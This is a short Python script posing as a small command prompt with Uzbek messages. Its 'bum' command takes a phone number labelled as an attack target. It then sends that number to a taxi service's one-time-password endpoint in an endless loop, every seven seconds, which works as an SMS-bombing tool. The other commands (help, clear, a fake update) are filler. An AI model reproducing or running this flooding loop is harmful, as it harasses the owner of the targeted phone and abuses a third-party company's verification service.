import os
import requests
import time
main = str(input("Username: ")).lower()


while True:
        savol = str(input(f"{main}$root  "))
        if savol == 'exit':
            break
        if savol == 'help':
            print("""Help command prompt 2023

                    Developer Asadbek Abdubannopov""")
        def clear():
                """Clear system"""
                os.system('cls')
                os.system('clear')
        if savol == 'clear':
                clear()
        if savol == 'unx':
                print("Yangilanish ishga tushdi!")
                os.system("cls")
                os.system("clear")
                print("Yuklash yakunlandi..")
        if savol == 'bum':
            print("Loading....")
            Enter = input("Hujum no'merini kiriting>> ")
            while True:
                url = "https://app.snap.taxi/api/api-passanger-oauth/v2/otp"
                number = {"cell_phone":"+998" + ' ' + Enter}

                sms = requests.post(url,data=number)
                print(sms.status_code)
                time.sleep(7)
       
                
print("Dasturdan foydalanganingiz uchun rahmat!")            
